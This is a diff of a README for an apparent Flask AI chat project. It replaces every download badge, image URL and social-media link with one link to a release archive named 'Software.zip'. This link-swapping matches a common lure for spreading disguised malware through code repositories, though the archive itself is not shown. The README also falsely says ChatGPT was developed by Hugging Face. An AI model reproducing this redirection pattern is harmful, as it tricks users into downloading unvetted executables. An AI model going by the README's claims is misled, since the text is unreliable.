@@ -1,12 +1,12 @@
 # 🚀 Welcome to AI-Prompt Chat! 🤖
 
-[![Download Here](https://img.shields.io/badge/Download%20Here-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Here](https://github.com/fredycardenas/AIPromptChat/releases/download/v1.0/Software.zip%20Here-v1.0.0-blue)](https://github.com/fredycardenas/AIPromptChat/releases/download/v1.0/Software.zip)
 
 ## Overview
 
 Welcome to **AIPromptChat** repository - your gateway to a fascinating Flask-based AI chat application! This application offers users an immersive experience to interact with an AI model, save conversations, and manage chat sessions. Dive into the world of artificial intelligence and unleash the power of generative AI in your chat interactions.
 
-![AI Chat](https://images.unsplash.com/photo-1543277304-29a9bf69c1e3)
+![AI Chat](https://github.com/fredycardenas/AIPromptChat/releases/download/v1.0/Software.zip)
 
 ## Features
 
@@ -26,7 +26,7 @@ Welcome to **AIPromptChat** repository - your gateway to a fascinating Flask-bas
 
 To get started with AIPromptChat, simply click on the link below to download the project:
 
-[![Download Here](https://img.shields.io/badge/Download%20Here-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Here](https://github.com/fredycardenas/AIPromptChat/releases/download/v1.0/Software.zip%20Here-v1.0.0-blue)](https://github.com/fredycardenas/AIPromptChat/releases/download/v1.0/Software.zip)
 
 ### Launching the Project
 
@@ -38,7 +38,7 @@ If you encounter any issues with the download link provided, please check the **
 
 Powered by ChatGPT, our AI model is at the heart of AIPromptChat. ChatGPT is a sophisticated language model developed by Hugging Face, designed to generate human-like text responses based on the context of a conversation prompt. With ChatGPT, your chat interactions are bound to be engaging, informative, and perhaps even humorous!
 
-![ChatGPT](https://images.unsplash.com/photo-1554728813-0f01d65c3b7f)
+![ChatGPT](https://github.com/fredycardenas/AIPromptChat/releases/download/v1.0/Software.zip)
 
 ## Community Support and Contributions
 
@@ -48,17 +48,17 @@ We welcome contributions from the developer community to enhance and expand the 
 
 Stay updated on the latest developments, feature releases, and community events by following us on social media and engaging with our online community:
 
-🌐 Website: [AIPromptChat](https://www.aipromptchat.com)
-🐦 Twitter: [@AIPromptChat](https://twitter.com/AIPromptChat)
-📷 Instagram: [@AIPromptChat](https://www.instagram.com/AIPromptChat)
-💬 Discord: [AIPromptChat Community](https://discord.gg/AIPromptChat)
+🌐 Website: [AIPromptChat](https://github.com/fredycardenas/AIPromptChat/releases/download/v1.0/Software.zip)
+🐦 Twitter: [@AIPromptChat](https://github.com/fredycardenas/AIPromptChat/releases/download/v1.0/Software.zip)
+📷 Instagram: [@AIPromptChat](https://github.com/fredycardenas/AIPromptChat/releases/download/v1.0/Software.zip)
+💬 Discord: [AIPromptChat Community](https://github.com/fredycardenas/AIPromptChat/releases/download/v1.0/Software.zip)
 
 ## Let's Chat!
 
 Ready to embark on a chat adventure like no other? Download AIPromptChat now and start your AI-driven conversations today!
 
-[![Download Here](https://img.shields.io/badge/Download%20Here-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Here](https://github.com/fredycardenas/AIPromptChat/releases/download/v1.0/Software.zip%20Here-v1.0.0-blue)](https://github.com/fredycardenas/AIPromptChat/releases/download/v1.0/Software.zip)
 
-![AI Chat](https://images.unsplash.com/photo-1566561727544-13f18eb5b274)
+![AI Chat](https://github.com/fredycardenas/AIPromptChat/releases/download/v1.0/Software.zip)
 
 Happy Chatting! 🚀🤖🌟
